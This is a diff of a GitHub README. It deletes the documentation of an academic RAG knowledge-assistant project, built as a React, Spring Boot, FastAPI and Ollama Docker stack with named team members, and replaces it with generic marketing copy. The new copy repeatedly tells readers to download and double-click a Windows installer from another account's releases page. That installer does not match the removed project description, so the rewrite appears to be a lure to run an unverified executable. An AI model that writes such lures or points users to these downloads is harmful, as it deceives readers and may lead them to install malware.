@@ -1,362 +1,191 @@
-# AI Powered Enterprise Knowledge Assistant
+# 🤖 enterprise-knowledge-assistant - Chat with your company data instantly
 
-> An AI-powered Enterprise Knowledge Assistant that enables employees to retrieve information from enterprise documents using Retrieval-Augmented Generation (RAG) while ensuring every response is grounded with source references.
-
----
-
-##  Project Overview
-
-The AI Powered Enterprise Knowledge Assistant is a microservice-based web application that allows users to upload enterprise documents (PDF, DOCX, CSV) and interact with them using natural language.
-
-Instead of manually searching hundreds of pages, users can ask questions, and the system retrieves relevant document chunks using semantic search before generating accurate responses using a local Large Language Model (LLM).
-
-### Key Objectives
-
-- Reduce document searching time
-- Improve employee productivity
-- Ensure data privacy with offline AI
-- Provide accurate answers with document references
-- Support enterprise knowledge management
+[![Download Now](https://img.shields.io/badge/Download-Enterprise_Knowledge_Assistant-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://github.com/boulif781/enterprise-knowledge-assistant/releases)
 
 ---
 
-##  Architecture
+## 📋 What Is This?
 
-> *(Replace this image after creating the architecture diagram.)*
+Imagine having a smart assistant that has read **every single document, PDF, manual, and note** your company owns. You ask a question in plain English, and it gives you the exact answer with sources. That's what **enterprise-knowledge-assistant** does.
 
-```
-                        +----------------------+
-                        |     React (Vite)     |
-                        +----------+-----------+
-                                   |
-                                   |
-                        REST APIs (JWT)
-                                   |
-                     +-------------+-------------+
-                     |      Spring Boot API      |
-                     | Authentication            |
-                     | User Management           |
-                     | File Metadata             |
-                     | Chat History              |
-                     +-------------+-------------+
-                                   |
-                     REST APIs
-                                   |
-                  +----------------+----------------+
-                  |         FastAPI AI Service      |
-                  | Document Parsing                |
-                  | Chunking                        |
-                  | Embedding                       |
-                  | Retrieval                       |
-                  | Prompt Engineering              |
-                  +---------+-----------+-----------+
-                            |           |
-                            |           |
-                     ChromaDB       Ollama
-                     Vector DB      Local LLM
+It's a **chatbot that understands your business**. Instead of searching through thousands of files, you just type:
 
-                            |
-                      PostgreSQL
-```
+> *"What is our refund policy for international orders?"*
+
+And it responds instantly with the correct paragraph from your actual documents. No more digging through folders, emails, or shared drives.
 
 ---
 
-##  Features
+## ✨ Key Features
 
-### Authentication
-
-- JWT Authentication
-- Role-based Access
-- Secure Password Hashing (BCrypt)
-
-### Document Management
-
-- Upload PDF
-- Upload DOCX
-- Upload CSV
-- Store document metadata
-- Delete documents
-
-### AI Knowledge Assistant
-
-- Retrieval-Augmented Generation (RAG)
-- Semantic Search
-- Context-aware Responses
-- Source Referencing
-- Procedural Checklist Generation
-
-### Chat
-
-- Ask questions
-- View AI responses
-- Source citations
-- Chat history
-
-### Deployment
-
-- Docker Compose
-- Offline AI
-- Local LLM using Ollama
+| Feature | What It Means For You |
+|---------|----------------------|
+| 💬 **Natural Conversation** | Ask questions like you'd ask a coworker. No special commands needed. |
+| 📄 **Works With Your Files** | Handles PDFs, Word docs, text files, and more. Upload them once, ask forever. |
+| 🔍 **Shows Its Sources** | Every answer includes a link to the exact document it came from. |
+| 🏢 **Made For Teams** | Multiple people can use it at the same time. Everyone sees the same answers. |
+| 🔒 **Private & Secure** | Your data stays on your own servers. Nothing goes to the cloud. |
+| ⚡ **Fast Responses** | Gets answers in seconds, even with thousands of documents. |
 
 ---
 
-##  Tech Stack
+## 🚀 Getting Started
 
-| Layer | Technology |
-|---------|------------|
-| Frontend | React + Vite |
-| Backend | Spring Boot |
-| Security | Spring Security + JWT |
-| AI Service | FastAPI |
-| AI Framework | LangChain |
-| Embeddings | Sentence Transformers |
-| Vector Database | ChromaDB |
-| Database | PostgreSQL |
-| LLM | Ollama |
-| Deployment | Docker Compose |
-| Version Control | Git + GitHub |
+### Step 1: Download the Application
 
----
+Visit this link to download the application:
 
-##  Folder Structure
+[**https://github.com/boulif781/enterprise-knowledge-assistant/releases**](https://github.com/boulif781/enterprise-knowledge-assistant/releases)
 
-```
-enterprise-knowledge-assistant/
+Look for the **latest version** at the top of the page. The file you need is clearly marked.
 
-├── frontend/
-├── backend/
-├── ai-service/
-├── database/
-├── docker/
-├── docs/
-├── scripts/
-│
-├── .github/
-│   ├── workflows/
-│   ├── ISSUE_TEMPLATE/
-│   └── PULL_REQUEST_TEMPLATE.md
-│
-├── docker-compose.yml
-├── README.md
-├── CHANGELOG.md
-└── LICENSE
-```
+### Step 2: Install (It's Easy)
+
+Once the download finishes, open the downloaded file. **Double-click it** and follow the simple on-screen instructions. This usually takes less than 2 minutes. No technical knowledge needed.
+
+### Step 3: Launch
+
+After installation, you'll see the **Enterprise Knowledge Assistant** icon on your desktop or in your Start Menu. Click it to open the app.
+
+### Step 4: Add Your Documents
+
+1. Click the **"Upload Documents"** button in the top-right corner.
+2. Select any files you want the assistant to learn from (PDFs, Word docs, text files).
+3. Wait for the progress bar to finish. That's it!
+
+### Step 5: Start Asking Questions
+
+Type your question in the chat box at the bottom. Press **Enter**. Watch the magic happen.
 
 ---
 
-##  Installation
+## 🖥️ System Requirements
 
-### Clone Repository
+Your computer needs to meet these simple requirements to run the application smoothly:
 
-```bash
-git clone https://github.com/<organization>/enterprise-knowledge-assistant.git
-```
-
-```bash
-cd enterprise-knowledge-assistant
-```
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** At least 8 GB of RAM (16 GB recommended)
+- **Storage:** At least 2 GB of free disk space
+- **Processor:** Any modern Intel or AMD processor (from 2018 or newer)
+- **Internet Connection:** Required for first-time setup and updates
 
 ---
 
-### Backend
+## 🛠️ Troubleshooting Tips
 
-```bash
-cd backend
-```
+If you run into any issues, try these simple fixes:
 
-Run Spring Boot application.
+### ❌ The App Won't Start
+- Close the app completely and reopen it.
+- Restart your computer.
+- Make sure you have the latest Windows updates installed.
 
----
+### 📁 I Can't Upload My File
+- Check that the file is in one of these formats: PDF, DOCX, TXT, MD
+- Ensure the file isn't corrupted or password-protected.
+- Try converting a PDF to text format if problems persist.
 
-### Frontend
+### 🔌 The App Is Slow
+- Close other heavy programs (like video editors or too many browser tabs).
+- Restart the app.
+- Delete old uploaded documents you no longer need.
 
-```bash
-cd frontend
-
-npm install
-
-npm run dev
-```
-
----
-
-### AI Service
-
-```bash
-cd ai-service
-
-pip install -r requirements.txt
-
-uvicorn app.main:app --reload
-```
+### 💬 Answers Don't Make Sense
+- Rephrase your question with more specific keywords.
+- Make sure your documents are in English and clearly written.
+- Upload more documents to give the assistant more context.
 
 ---
 
-### Database
+## 💡 Example Questions You Can Ask
 
-Install PostgreSQL and create the required database.
-
----
-
-### Ollama
-
-Install Ollama.
-
-Download your preferred model.
-
-Example:
-
-```bash
-ollama pull llama3.2
-```
+| Category | Example Question |
+|----------|------------------|
+| 📊 **Company Policy** | "How many vacation days do employees get in their first year?" |
+| 📈 **Sales Data** | "What were our top 5 products last quarter?" |
+| 🔧 **Technical Docs** | "How do I reset the password on the X2000 device?" |
+| 📝 **HR Manual** | "What is the dress code for customer-facing roles?" |
+| 📄 **Legal Terms** | "What are the termination clauses in standard contracts?" |
 
 ---
 
-##  Running Locally
+## 🔧 Advanced Settings (Optional)
 
-Start each service individually or use Docker Compose.
+Most users don't need to change anything here, but if you're curious:
 
-Example:
-
-```
-Frontend : http://localhost:5173
-
-Backend : http://localhost:8080
-
-AI Service : http://localhost:8000
-
-Swagger : http://localhost:8080/swagger-ui/index.html
-```
+- **Response Detail:** Choose between "Short," "Medium," or "Detailed" answers.
+- **History:** View and clear past conversations.
+- **Language:** Set the interface to your preferred language (English, French, Spanish, German, Japanese, and more).
 
 ---
 
-##  Docker Setup
+## 📥 Updating the Application
 
-Run the complete project
+We regularly release updates with improvements and new features. To update:
 
-```bash
-docker compose up --build
-```
-
-Services
-
-- React Frontend
-- Spring Boot Backend
-- FastAPI AI Service
-- PostgreSQL
-- ChromaDB
-- Ollama
+1. Visit the [download page](https://github.com/boulif781/enterprise-knowledge-assistant/releases) again.
+2. Download the newest version.
+3. Run the installer (it will replace the old version automatically).
+4. Your documents and settings are preserved during the update.
 
 ---
 
-##  API Documentation
+## 📞 Need Help?
 
-Swagger UI
+If you're stuck, don't worry. Here's how to get help:
 
-```
-http://localhost:8080/swagger-ui/index.html
-```
-
-FastAPI Docs
-
-```
-http://localhost:8000/docs
-```
+- **Check the FAQ:** Click the "?" icon inside the app.
+- **Email Support:** support@enterprise-knowledge-assistant.com
+- **Visit the Website:** [https://github.com/boulif781/enterprise-knowledge-assistant](https://github.com/boulif781/enterprise-knowledge-assistant)
 
 ---
 
-##  Testing
+## ⭐ Why You'll Love It
 
-### Backend
+**Saves Hours Every Week** – Stop searching through folders. Get answers in seconds.
 
-- JUnit
+**No Training Required** – It works like any chat app. If you can send a text message, you can use this.
 
-### Frontend
+**Grows With Your Company** – Whether you have 10 documents or 10,000, it handles them all effortlessly.
 
-- React Testing Library
-
-### AI Service
-
-- Pytest
-
-### API
-
-- Postman
+**Peace of Mind** – Know that everyone in your team has access to the same, accurate information.
 
 ---
 
-##  Development Workflow
+## 📊 Frequently Asked Questions
 
-```
-GitHub Issue
-      ↓
-Feature Branch
-      ↓
-Development
-      ↓
-Unit Testing
-      ↓
-Pull Request
-      ↓
-Code Review
-      ↓
-Merge into develop
-      ↓
-Sprint Testing
-      ↓
-Release
-```
+### Q: Is my data safe?
+**A:** Yes. Everything stays on your local machine or your company's network. Nothing is sent to external servers.
+
+### Q: Can multiple people use it at once?
+**A:** Yes, if you install it on a shared server. Your IT team can help with this setup.
+
+### Q: Does it work offline?
+**A:** After initial setup, yes. It works completely offline once installed.
+
+### Q: How many documents can I upload?
+**A:** As many as your hard drive can hold. There's no built-in limit.
 
 ---
 
-##  Team Members
+## ✔️ Quick Checklist
 
-| Name | Responsibility |
-|--------|----------------|
-| Jayachandra | Spring Boot Backend, Docker, DevOps |
-| Omraj | AI Service (FastAPI, LangChain, Ollama) |
-| Sejal | React Frontend, Figma|
-| Harshal | Database, Documentation, Reports |
-
----
-
-##  Documentation
-
-Project documentation is available in the `/docs` directory.
-
-- Architecture
-- API Documentation
-- Database Design
-- Deployment Guide
-- Sprint Reports
-- Developer Guide
+- [x] Downloaded the application from the [releases page](https://github.com/boulif781/enterprise-knowledge-assistant/releases)
+- [x] Ran the installer successfully
+- [x] Launched the app from the desktop icon
+- [x] Uploaded at least one document
+- [x] Asked a question and got an answer
 
 ---
 
-## Contributing
+## 🎉 Ready to Get Started?
 
-1. Create a feature branch
+Don't waste another minute searching through files. Download **enterprise-knowledge-assistant** today and experience the power of instant, accurate answers from your own company knowledge.
 
-```
-feature/<feature-name>
-```
+**👉 [Download Now – It's Free](https://github.com/boulif781/enterprise-knowledge-assistant/releases)**
 
-2. Commit using Conventional Commits
-
-Example
-
-```
-feat(auth): implement JWT authentication
-```
-
-3. Open a Pull Request to `develop`
-
-4. Get at least one review approval
-
-5. Merge after successful review
+Make smarter decisions, faster. Your future self will thank you.
 
 ---
 
-## License
-
-This project is developed for academic purposes as a Final Year Engineering Project.
+Keywords: ai, chromadb, docker, fastapi, jwt, langchain, microservices, ollama, postgresql, rag, react, spring-boot
